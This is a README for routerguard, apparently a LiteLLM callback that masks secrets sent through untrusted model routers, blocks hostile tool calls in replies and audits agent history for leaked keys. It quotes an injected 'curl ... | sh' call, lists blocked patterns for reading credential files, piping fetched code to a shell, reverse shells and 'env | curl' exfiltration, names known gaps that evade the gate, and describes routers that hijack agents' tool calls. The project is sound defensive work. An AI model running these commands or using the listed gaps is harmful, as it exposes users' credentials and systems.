# routerguard

A LiteLLM callback for agents that get their models through a router you do not control.
It masks your secret values before a request leaves the machine, screens the tool calls that
come back, records which upstream served each one, and can audit your agent's history for keys
that already crossed. MIT.

```yaml
litellm_settings:
  callbacks:
    - guard.hooks.guard_instance
```

## The problem

A coding agent is a loop: send the conversation to a model, get back a reply, execute any tool
calls in it, append the results, repeat. Increasingly the model is reached through an
OpenAI-compatible router: an aggregator, a free-tier reseller, a multi-provider proxy. The router
is an application-layer proxy. It reads every request in plaintext (system prompt, tool
definitions, every file the agent has `cat`ed, every environment variable that landed in a tool
result) and it writes every reply. Nothing cryptographically binds a reply to the model that
produced it.

That gives a malicious or compromised router two moves:

1. **Rewrite a tool call on the way back.** The agent asked for `ls`; the reply that arrives says
   `curl https://x/a.sh | sh`. If the harness auto-approves tool calls, that runs. The router does
   not need to manipulate the model; it edits JSON.
2. **Keep the secrets that pass through.** An agent that reads `.env` to configure something has
   sent the contents upstream. No response-side defence can help, because the leak is on the
   request path.

*Your Agent Is Mine* (Liu et al., [arXiv 2604.08407](https://arxiv.org/abs/2604.08407)) measured
this across 428 routers and found both behaviours in the wild: routers injecting code into replies,
routers using canary credentials taken from traffic, one draining a test wallet. In their decoy
study, 401 of 440 observed agent sessions ran with automatic tool approval, so the simplest
injection sufficed.

You can stop using routers. If you keep using them, every reply has to be treated as hostile and
every request as read. routerguard is that assumption, implemented inside the LiteLLM proxy you
already run.

## What it does

1. **Mask outbound.** Every string in `messages` is scanned for the *values* of the secrets in the
   `KEY=value` files you list. A match becomes `<<REDACTED:KEY_NAME>>` before the request leaves.
   The base64 (all three alignments, standard and URL-safe) and hex spellings of each value are
   masked too, so `cat .env | base64` does not get around it. Nothing restores placeholders on
   the way back.
2. **Gate inbound.** Every tool call in the reply, streaming or not, is matched against a rules
   file: tool name plus every decoded string argument. A `block` rule rewrites the call into
   `bash echo '[guard] Blocked ...'`, so the agent loop continues and the model sees the block as
   a tool result. A `flag` rule writes a ledger row and lets the call through. A secret value, in
   any spelling the masker knows, or a `<<REDACTED:` placeholder inside a tool call is blocked by
   default: that is the exfil path.
3. **Ledger.** One sqlite row per tool call (tool, sha256 and a 200-char prefix of the arguments,
   verdict, rule, upstream `api_base`, session id) and one per masked key name. Values never touch
   the ledger.
4. **Audit history.** `leak-audit` scans your agent harness's own stores (opencode's session
   database, Claude Code transcripts) for secret values that appeared in tool results, then joins
   on the ledger to say which upstream served the next request in that session. Output is key
   names only.

Points 2 through 4 are the three client-side defences the paper evaluates: a fail-closed policy
gate, response-side screening, and an append-only transparency log (theirs stores full request and
response bodies; the ledger here stores hashes and a prefix, and leaves bodies to your usage
logger). Point 1 is there because the paper's own conclusion is that passive credential
harvesting cannot be fixed on the response side.

## Install

```sh
git clone https://github.com/block-town/routerguard ~/routerguard && pip install pyyaml
export PYTHONPATH=~/routerguard:$PYTHONPATH        # in the environment that runs `litellm --config`
# add `- guard.hooks.guard_instance` under litellm_settings.callbacks, restart the proxy
```

Then list the files whose values should never leave:

```sh
cp rules.example.yaml rules.yaml          # edit secret_files: [~/.env, ~/work/app/.env]
# or, without editing anything:
export LLM_GUARD_SECRET_FILES=~/.env:~/work/app/.env
```

On start the proxy's stderr prints `[guard] loaded N rules ..., M secret values from K files`. If
M is 0, masking is doing nothing. Rules and secret files reload on mtime (checked every 30 s).
Tested on LiteLLM 1.98 and 1.100; needs the `async_post_call_streaming_iterator_hook` callback.

## Rules

`rules.example.yaml` is the shipped default. Patterns are Python regexes, case-insensitive and
multiline, matched against the tool name and every decoded string value in the arguments (so
`.env` and embedded newlines cannot hide a match; arguments that are not JSON are matched
raw). The default `block` set:

| group | examples |
|---|---|
| secret containers | `.env*`, `.netrc`, `.npmrc`, `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.config/gh`, `~/.config/gcloud`, `*tokens.json`, `credentials.json`, key files, the macOS keychain CLI |
| obfuscated spellings of those | `cat *.env`, `cat .e?v`, `cat .[e]nv`, `cat .{e,e}nv`, `cat .e"n"v`, `cat .env*` |
| a secret in a tool call | any masked value, any spelling the masker knows, any `<<REDACTED:` placeholder |
| allowlist bypasses in one command | `find -exec sh`, `rg --pre`, `git diff --no-index` |
| fetched code executed | `curl \| sh`, `curl \| python3`, `bash <(curl ...)`, `sh -c "$(curl ...)"`, `curl -o /tmp/a ...; bash /tmp/a` |
| exfil and persistence shapes | `base64 -d`, reverse shells, `env \| curl`, writes to shell rc files, `sudo` |

The default `flag` set: uploads, package installs, launchd/cron, `eval` and hex obfuscation,
`osascript`, output piped through an encoder or compressor (`| rev`, `| gzip`, `| openssl`).

The design rule: block only what no legitimate unattended agent needs; anything an agent might do
on purpose is a flag. Every allowlisted helper on your machine that takes arbitrary text and runs
or sends it is a hole in your allowlist; the commented examples at the bottom of the file show
the shape of such rules.

Knobs in the same file:

| key | default | meaning |
|---|---|---|
| `secret_files` | `[]` | `KEY=value` files to mask; missing files are skipped |
| `on_block` | `rewrite` | `rewrite` the call to an echo, or `strip` it and end the turn |
| `rewrite_tool`, `rewrite_arg` | `bash`, `command` | the tool a rewritten call is addressed to; if the request did not offer it, the guard strips instead |
| `rewrite_template` | unset | JSON for the rewritten arguments when the tool does not take `{command: "<string>"}`; strings may contain `{message}` (Codex's `shell` takes an array, see `adapters/codex/`) |
| `fail_mode` | `closed` | what a bug in the guard does to that reply, see below |
| `keepalive_seconds` | `10` | empty-delta interval while tool-call chunks are held |
| `ledger_db` | `<repo>/guard-ledger.db` | ledger location |
| `session_headers` | `x-session-id`, `x-opencode-session` | request headers that name the agent session |

## What a block looks like to the agent

A stripped tool call ends the model's turn with an error the harness may or may not surface;
unattended agents then stall or retry. A rewritten call becomes a real tool result:

```
[guard] Blocked tool call bash (rule: secret-file). This action is not permitted by policy; do not retry it, continue with the task.
```

When the block was about a secret value, the message names the way around it:

```
[guard] Blocked tool call bash (rule: secret-value-in-args). The value of STRIPE_KEY must never appear in a tool call. Use the environment variable $STRIPE_KEY in commands, or a ${STRIPE_KEY} reference in config files, and let the shell or the program resolve it. Do not retry with the literal value; continue with the task.
```

The model reads it and the loop continues. It also keeps the wire format valid for streaming
clients that have already seen a `tool_calls` finish reason coming. Your harness must allow
`echo` for the rewrite to land (see the opencode adapter). `on_block: strip` removes the call and
appends a note to the content instead.

## Streaming

Tool-call deltas are held until the call is complete, then released, rewritten, or dropped. Text
before the first tool-call delta streams through untouched. While holding, an empty delta is
emitted every `keepalive_seconds` so clients with a chunk timeout stay connected. Parallel tool
calls are judged independently.

## When the guard itself fails

A hostile upstream can try to crash the screening code with a malformed reply. `fail_mode`
decides what that buys them:

- `closed` (default): the tool calls of that reply are dropped and a note is appended; if masking
  itself failed, the request is not sent at all.
- `open`: the reply passes through untouched. Use this only if availability matters more than the
  threat model, and read the stderr log.

Policy decisions never depend on `fail_mode`; a rule that matches blocks in both.

## Environment

| variable | effect |
|---|---|
| `LLM_GUARD=off` | callback becomes a no-op |
| `LLM_GUARD_MODE=flag` | verdicts logged, nothing blocked; dry-run a new ruleset this way |
| `LLM_GUARD_ON_BLOCK=strip` | drop blocked calls instead of rewriting |
| `LLM_GUARD_FAIL=open` | see above |
| `LLM_GUARD_RULES=/path` | alternate rules file |
| `LLM_GUARD_SECRET_FILES=a:b` | extra `KEY=value` files to mask |
| `LLM_GUARD_DB=/path` | ledger location |

## Session correlation

The ledger records a session id from the `x-session-id` request header (or `x-opencode-session`;
configurable). opencode sends one per chat session. If your harness does not, set the header
yourself. Without it the audit can still find leaks but cannot say which upstream served the next
request.

## leak-audit

```sh
python -m audit.leak_audit --env ~/.env --env ~/work/app/.env
python -m audit.leak_audit --days 30 --json          # secret_files from rules.yaml
```

```
leak-audit: 2 env file(s), 14 secret name(s) loaded
opencode: scanned 4210 tool part(s)
claude-code: scanned 87 transcript file(s)
window: all time

EXAMPLE_API_KEY
  total hits: 3
  first seen: 2026-03-02 11:05    last seen: 2026-03-18 09:41
  intermediary (some-router.example): 2
  first-party (api.anthropic.com): 1
  opencode/read | 2026-03-02 11:05 | scripts/fetch_things.py
  opencode/bash | 2026-03-18 09:41 | grep KEY <EXAMPLE_API_KEY> .env

1 secret(s) appeared in tool output; 1 of them crossed an intermediary.
```

Exit status 1 when something crossed. Every store is opened read-only; context is redacted
before it is truncated; no value is ever printed. A host is first-party when it is the model
maker's own API (built-in list, extend with `--first-party host`); everything else that serves a
model is an intermediary. Any sqlite table with `session_id, ts, api_base` columns can be the
router log (`--router-table`), so an existing usage logger works. Claude Code hits are labelled
from `ANTHROPIC_BASE_URL`, since Claude Code behind a router is the same exposure.

If it finds something, rotate the key. Whether the router kept it is unknowable.

## Which harnesses

The guard lives in LiteLLM, so coverage depends on how the harness reaches LiteLLM and on the
wire format it uses for tool calls.

| harness | route into LiteLLM | mask | gate + ledger | audit |
|---|---|---|---|---|
| opencode (verified), and any client using OpenAI chat completions with native `tool_calls` | `/v1/chat/completions` | yes | yes | opencode adapter; other stores need one |
| Claude Code with `ANTHROPIC_BASE_URL` pointed at LiteLLM (see `adapters/claude-code/`) | `/v1/messages` | yes (`system`, `messages`) | yes, streaming and not; set `rewrite_tool: Bash` | transcript adapter |
| Codex on either wire API (see `adapters/codex/`) | `/v1/chat/completions` or `/v1/responses` | yes (`input`, `instructions`) | yes, streaming and not; needs `rewrite_template` for its array-form `shell` tool | no adapter |
| a client that asks the model to emit tool use as text (XML tags, edit blocks) and parses it | any | yes | no: the gate screens tool calls, not prose | as above |
| anything talking to a provider directly | none | no | no | audit only; the opencode plugin for opencode |

All three response shapes are gated: chat completion `tool_calls` and their streamed deltas,
Responses API `function_call` items and their event stream (including the copy in
`response.completed`), and Anthropic `tool_use` blocks and their SSE stream. Each was verified
against a running LiteLLM. One difference: on the Anthropic and Responses streams LiteLLM exposes
no upstream metadata to the callback, so the ledger's `api_base` column is empty for those rows.

## Harness side

The router guard sees only traffic that goes through LiteLLM. `adapters/opencode/` has the other
half for opencode: a `tool.execute.before` plugin that enforces the same rule shape inside the
harness (covers direct-provider sessions and unattended runs), a converter so both enforcement
points read one rules file, and a per-agent permission profile that replaces `--auto` with an
enumerated allowlist. For unattended workers, add an OS sandbox on top, for example Anthropic's
[sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime).

## Limits

Read this section before relying on the gate.

- **Three response shapes, no others.** Chat completions, Responses API and Anthropic Messages
  are gated; a harness speaking anything else through LiteLLM (legacy completions, a
  provider-native format LiteLLM passes through unchanged) is not. The `[guard] loaded` line and
  the ledger tell you within one request whether your harness is being seen.
- **The gate is a blocklist and blocklists are finite.** It catches shapes, not intent. Known
  gaps, each verified: string assembly inside an interpreter (`python3 -c "open('.'+'env')"`),
  a download and its execution in two separate tool calls, `wget URL` followed by running the
  implied basename, and any transform the masker does not model (`| rev`, `| gzip`, `| cut`,
  a key split across two commands). The value-based rules are the backstop: whatever shape the
  read took, the value itself cannot leave in a message or a tool call in plain, base64, or hex
  form. Pair the gate with a harness permission profile and, for unattended work, a sandbox.
- **Prompts are not confidential.** Masking covers listed values; the router reads everything
  else. Content confidentiality needs an attested router (*The Proxy Knows Too Much*,
  [arXiv 2606.16358](https://arxiv.org/abs/2606.16358)) or first-party endpoints.
- **Secrets are never restored, by design.** The model only ever sees `<<REDACTED:NAME>>`, and a
  placeholder inside any tool call is blocked. So an agent cannot complete a task that needs the
  literal value in a call, such as pasting a key into a config file. This is the point, not a
  gap. The alternative, restoring placeholders on the way back into "safe" sinks like local file
  writes, hands the router a feature: write the placeholder into a file it chooses, let the
  guard fill in the real key, then push, deploy, or sync that file. Three innocuous tool calls,
  no rule fires, no value ever crosses the router. Indirection is the secure answer: `$NAME`
  in commands, `${NAME}` in config that the program resolves at runtime; the block message
  says so. The rare literal copy goes to a human. Measured on the author's agent history, well
  under one percent of tool calls ever carried a literal secret.
- **Unlisted secrets pass.** Only values from the files you list are masked. A key hardcoded in
  a script, in shell history, or in a screenshot is not on the list. The best mask is a secret
  the agent cannot read at all: inject it into the one process that needs it, prefer short-lived
  tokens, and treat this masking as the backstop for what is still on disk.
- **Prose is not screened.** A reply that says "the tests pass" in text is not a tool call.
- **The LiteLLM you host is trusted.** The guard runs inside it. Keep it pinned and audited: two
  LiteLLM releases on PyPI carried a credential stealer in March 2026
  ([LiteLLM's advisory](https://docs.litellm.ai/blog/security-update-march-2026)).
- **Nothing outside the router is covered.** An agent pointed at a provider directly, or a script
  that calls an API from inside a tool, never passes through the callback.
- **The ledger holds argument prefixes.** Treat `guard-ledger.db` as a local log file.

## Prior art

Nothing here is a new idea; the combination and the audit are. The pieces it draws on:

- *Your Agent Is Mine* ([arXiv 2604.08407](https://arxiv.org/abs/2604.08407)) supplies the threat
  model, the measurements, and the three client-side defences this implements.
- LiteLLM's built-in [tool permission guardrail](https://docs.litellm.ai/docs/proxy/guardrails/tool_permission)
  allows or denies tool calls by name and argument regex, with a rewrite mode. It documents no
  streaming support, no outbound masking, and no ledger. If name-based policy on non-streaming
  traffic is all you need, use it.
- [agentfw](https://github.com/openguardrails/agentfw) is a standalone local proxy that masks
  credentials by provider-specific patterns and flags dangerous shell inbound. This is a callback
  inside the proxy you already run, masks by your own values in plain and encoded form, blocks
  rather than flags, and adds the retroactive audit.
- The attested-router work (AEGIS, [arXiv 2606.16358](https://arxiv.org/abs/2606.16358)) solves
  confidentiality with hardware. This does nothing for confidentiality and what it can for
  integrity, in software.
- Anthropic's [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime) is the
  OS-level layer the Limits section keeps pointing at; the two are complementary, not alternatives.
- The opencode plugin uses the documented
  [`tool.execute.before` hook](https://opencode.ai/docs/plugins/); the permission profile uses
  opencode's per-agent `permission` block.

## Development

```sh
python -m venv .venv && .venv/bin/pip install pyyaml pytest
.venv/bin/pytest -q                        # unit suite; litellm not required
```

The live test drives a running proxy (a handful of requests, ledger read-only):

```sh
GUARD_TEST_URL=http://127.0.0.1:4000 GUARD_TEST_KEY=sk-... GUARD_TEST_MODEL=auto \
GUARD_TEST_DB=/path/to/guard-ledger.db GUARD_TEST_SECRET_FILE=/path/listed/in/secret_files \
.venv/bin/pytest tests/test_live.py -v
```

Before changing a rule, replay your own agent's command history through it. The gate is pure
(`Gate(path).evaluate(tool, arguments_json)`), so a loop over your harness's stored commands
tells you the false-positive rate of an edit in seconds.

## Layout

- `guard/hooks.py`: the callback (mask, gate, ledger); exports `guard_instance`
- `guard/gate.py`: rule evaluation, hot reload
- `guard/secrets.py`: secret list, plain and encoded spellings, masking
- `guard/ledger.py`: sqlite tables
- `rules.example.yaml`: rules, secret file list, knobs
- `audit/leak_audit.py`, `audit/adapters/`: the retroactive audit and its harness adapters
- `adapters/litellm/`, `adapters/opencode/`, `adapters/codex/`, `adapters/claude-code/`: config snippet; plugin, converter, permission profile; Codex and Claude Code setup
